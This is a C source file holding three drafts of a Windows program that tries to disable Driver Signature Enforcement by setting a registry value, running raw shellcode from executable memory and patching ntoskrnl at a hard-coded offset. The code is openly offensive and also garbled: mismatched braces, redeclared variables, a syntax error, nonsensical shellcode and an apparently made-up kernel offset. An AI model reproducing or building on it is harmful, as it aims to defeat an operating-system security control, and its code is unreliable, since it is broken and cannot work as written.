/*#include <windows.h>
#include <winternl.h>

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    HKEY hKey;
    DWORD dwType, dwSize = sizeof(DWORD);
    DWORD dwData;

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_QUERY_VALUE, &hKey);
    RegQueryValueExA(hKey, "DisablePagingExecutive", NULL, &dwType, (LPBYTE)&dwData, &dwSize);
    RegCloseKey(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NtQuerySystemInformation(11, &smi, sizeof(smi), &returnLength);
    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x48, 0x8B, 0x10, 
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00, 
        0x48, 0x89, 0x10 
    };

    BYTE pattern[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC1, 0x4C, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x33, 0xC0, 0xF6, 0xC1, 0x01 };

    for (DWORD i = 0; i < smi.Module[0].ImageSize - sizeof(pattern); i++) {
        if (memcmp((PVOID)((ULONG_PTR)ntoskrnlBase + i), pattern, sizeof(pattern)) == 0) {
            memcpy(&shellcode[2], (PVOID)((ULONG_PTR)ntoskrnlBase + i), sizeof(PVOID));
            break;
        }
    }

    LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}*/

////////////////////

#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    SYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength = 0;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi.Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
PSYSTEM_MODULE_INFORMATION smi;
ULONG returnLength = 0;
NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, &smi, sizeof(smi), &returnLength);
if (!NT_SUCCESS(status)) {
    printf("NtQuerySystemInformation failed\n");
    return -1;

PVOID ntoskrnlBase = smi.Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation];
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
}

return 0;
}

/////


============
last version 
============


#include <windows.h>
#include <winternl.h>
#include <stdio.h>

#define SystemModuleInformation 11
#define MmPagingFoundation 0x13B0

typedef NTSYSAPI NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct BASE_MODULE_ENTRY {
    ULONG Unknown1;
    ULONG Unknown2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT NameLength;
    USHORT NameOffset;
} BASE_MODULE_ENTRY, *PBASE_MODULE_ENTRY;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    BASE_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

int main() {
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    HMODULE hAdvapi32 = LoadLibraryA("advapi32.dll");
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    LPVOID LoadLibraryAAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    LPVOID GetProcAddressAddr = GetProcAddress(hKernel32, "GetProcAddress");
    LPVOID RegOpenKeyExAAddr = GetProcAddress(hAdvapi32, "RegOpenKeyExA");
    LPVOID RegQueryValueExAAddr = GetProcAddress(hAdvapi32, "RegQueryValueExA");
    LPVOID RegCloseKeyAddr = GetProcAddress(hAdvapi32, "RegCloseKey");
    LPVOID RegSetValueExAAddr = GetProcAddress(hAdvapi32, "RegSetValueExA");
    NtQuerySystemInformation_t NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(hNtdll, "NtQuerySystemInformation");

    if (!LoadLibraryAAddr || !GetProcAddressAddr || !RegOpenKeyExAAddr || !RegQueryValueExAAddr || !RegCloseKeyAddr || !RegSetValueExAAddr || !NtQuerySystemInformation) {
        printf("Failed to get function addresses\n");
        return -1;
    }

    HKEY hKey;
    DWORD dwData = 1;
    DWORD dwSize = sizeof(DWORD);

    if (((BOOL(WINAPI*)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY))RegOpenKeyExAAddr)(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key\n");
        return -1;
    }

    if (((LONG(WINAPI*)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD))RegSetValueExAAddr)(hKey, "DisablePagingExecutive", 0, REG_DWORD, (const BYTE*)&dwData, dwSize) != ERROR_SUCCESS) {
        printf("Failed to set registry value\n");
        ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);
        return -1;
    }

    ((LONG(WINAPI*)(HKEY))RegCloseKeyAddr)(hKey);

    PSYSTEM_MODULE_INFORMATION smi;
    ULONG returnLength;

    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation , &smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed\n");
        return -1;
    }

    PVOID ntoskrnlBase = smi->Module[0].ImageBase;

    BYTE shellcode[] = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0x8B, 0x10,
        0x48, 0x05, 0x07, 0x00, 0x00, 0x00,
        0x48, 0x89, 0x10,
        // Disable DSE
        0xB8, 0xFF, 0xFF, 0xFF, 0xFF,
        // Return address
        0xC3,
};

LPVOID shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
if (!shellcodeAddr) {
    printf("VirtualAlloc failed\n");
    return -1;
}
memcpy(shellcodeAddr, shellcode, sizeof(shellcode));

HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddr, NULL, 0, NULL);
if (!hThread) {
    printf("CreateThread failed\n");
    return -1;
}

WaitForSingleObject(hThread, INFINITE);

// Find the ntoskrnl.exe image
NTSTATUS systemStatus = NtQuerySystemInformation(SystemModuleInformation , (PVOID)&smi,sizeof(SYSTEM_MODULE_INFORMATION), &returnLength);
if (!NT_SUCCESS(systemStatus)) {
printf("NtQuerySystemInformation failed\n");
return -1;

PVOID ntoskrnlBase = smi->Module[0].ImageBase;

// Patch ntoskrnl.exe
DWORD* disableDSE = (DWORD*)((ULONG_PTR)ntoskrnlBase + MmPagingFoundation);
disableDSE[1] = 1; // Disable DSE

// Commit changes
FlushInstructionCache(GetCurrentProcess(), (PVOID)disableDSE,sizeof(DWORD));
HeapFree(GetProcessHeap(), 0, smi);
}

return 0;
}
